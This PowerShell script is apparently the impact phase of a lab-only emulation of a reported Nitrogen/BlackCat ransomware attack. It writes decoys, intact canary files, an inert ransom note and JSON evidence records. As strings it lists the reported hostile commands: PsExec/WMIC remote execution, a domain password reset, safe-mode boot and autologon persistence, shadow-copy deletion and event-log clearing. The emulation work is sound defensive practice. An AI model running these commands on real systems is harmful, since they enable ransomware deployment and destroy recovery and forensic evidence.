#Requires -Version 5.1
#Requires -RunAsAdministrator
[CmdletBinding()]
param([switch]$LabConfirmed)
. "$PSScriptRoot\NitrogenSim-utilities.ps1"
Assert-NitrogenSafety -LabConfirmed:$LabConfirmed
$p = Initialize-NitrogenEnvironment
if (-not (Test-Path (Join-Path $p.Evidence 'restic-exfiltration.json'))) { throw 'Run phase 2 first' }

$psexec = Join-Path $p.Impact 'PsExec64.exe'
$blackCat = Join-Path $p.Impact 'example.exe'
New-NitrogenDecoy $psexec 'PsExec deployment decoy'
New-NitrogenDecoy $blackCat 'BlackCat ransomware decoy' '25172A046821BD04E74C15DC180572288C67FDFF474BDB5EB11B76DCE1B3DAD3'
Write-NitrogenFile (Join-Path $p.Impact 'up.bat') @'
@echo off
REM INERT FORENSIC RECORD - NEVER EXECUTE REPORTED ACCOUNT CHANGE
REM PsExec64.exe \\DC01 net user REDACTED_BACKUP JapanNight!128 /domain
echo NITROGEN-BLACKCAT-CANARY
'@ 'inert account-change batch evidence'
Write-NitrogenFile (Join-Path $p.Impact '1.bat') @'
@echo off
REM INERT FORENSIC RECORD - NEVER EXECUTE REPORTED IMPACT COMMANDS
REM bcdedit /set {default} safeboot network
REM reg add HKLM\...\RunOnce /v *BlackCat /d C:\Windows\Temp\example.exe
REM reg add HKLM\...\Winlogon /v DefaultUserName /d REDACTED_BACKUP
REM reg add HKLM\...\Winlogon /v DefaultPassword /d JapanNight!128
REM reg add HKLM\...\Winlogon /v AutoAdminLogon /d 1
REM timeout /t 10 and immediate reboot
echo NITROGEN-BLACKCAT-CANARY
'@ 'inert safe-mode deployment batch evidence'

$reportedCommands = @(
    'xcopy \\FILE-SRV01\staging\PsExec64.exe C:\Windows\Temp\ /Y',
    'wmic /node:DC01 process call create C:\Windows\Temp\up.bat',
    'PsExec64.exe \\DC01 -s -d C:\Windows\Temp\1.bat',
    'net user REDACTED_BACKUP JapanNight!128 /domain',
    'bcdedit /set {default} safeboot network',
    'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v *BlackCat /d C:\Windows\Temp\example.exe',
    'reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v AutoAdminLogon /d 1',
    'shutdown /r /t 0',
    'sc delete 15991160457623399845550968347370640942',
    'wmic csproduct get UUID',
    'iisreset /stop',
    'reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /t REG_DWORD /d 65535',
    'vssadmin delete shadows /all /quiet',
    'wmic shadowcopy delete',
    'wevtutil cl System'
)
$impactRecord = [ordered]@{
    mode='evidence strings only; none invoked'
    reportedCommands=$reportedCommands
    serviceGuid='15991160457623399845550968347370640942'
    reportedCredential='JapanNight!128';credentialOrigin='public report';used=$false
    safeguards=@{accountsChanged=0;registryWrites=0;bootChanges=0;reboots=0;servicesChanged=0;logsCleared=0;shadowCopiesDeleted=0;IISStopped=$false;remoteHostsTouched=0}
}
Write-NitrogenFile (Join-Path $p.Evidence 'blackcat-reported-commands.json') ($impactRecord | ConvertTo-Json -Depth 9) 'impact negative-execution record'
Invoke-NitrogenDecoy $psexec 'PsExec64.exe \\DC01 -s -d C:\Windows\Temp\1.bat [ECHO-ONLY CANARY]'
Add-NitrogenTimeline 9300 'impact-staging' 'Account reset, PsExec, safe-mode, RunOnce, and reboot chain represented' @{actual='signed decoy echo plus JSON only';domainChanges=0;remoteExecution=$false;techniques=@('T1098','T1569.002','T1547.004')}

foreach ($hostName in @('APP-SRV01','FILE-SRV01','BACKUP-SRV01','DC01')) {
    $hostRoot = Join-Path $p.Impact $hostName
    New-Item $hostRoot -ItemType Directory -Force | Out-Null
    foreach ($name in @('quarterly-report.docx','database-backup.bak','operations.xlsx')) {
        $original = Join-Path $hostRoot $name
        Write-NitrogenFile $original "Generated intact canary for $hostName/$name. This content is not encrypted." 'intact impact canary'
        Write-NitrogenFile "$original.BLACKCAT-CANARY" "Marker only for $name; original remains intact." 'ransomware extension marker'
    }
}
Write-NitrogenFile (Join-Path $p.Impact 'RECOVER-README.txt') "INERT BLACKCAT CANARY NOTE`nNo files were encrypted. No payment or contact route exists. Generated originals remain intact." 'inert ransom note'
$childChain = [ordered]@{
    parent='example.exe (signed cmd.exe decoy)';children=@('example.exe normal-mode record','example.exe safe-mode record');tokenAccess='metadata only'
    encryptionPerformed=$false;filesModified=0;markerFilesCreated=12
    reportedHashes=@(
        @{name='example.exe';sha256='25172A046821BD04E74C15DC180572288C67FDFF474BDB5EB11B76DCE1B3DAD3'},
        @{name='2-REDACTED-51.exe';sha256='5FAC60F1E97B6EAAE18EBD8B49B912C86233CF77637590F36AA319651582D3C4'},
        @{name='domain_name.exe';sha256='D15CAB3901E9A10AF772A0A1BDBF35B357EE121413D4CF542D96819DC4471158'}
    )
}
Write-NitrogenFile (Join-Path $p.Evidence 'blackcat-process-and-hash-record.json') ($childChain | ConvertTo-Json -Depth 8) 'BlackCat behavior metadata'
Add-NitrogenTimeline 9360 'impact' 'BlackCat marker creation completed at reported 156-hour boundary' @{encryption=$false;intactOriginals=12;markers=12;techniques=@('T1486','T1490','T1070.001')}
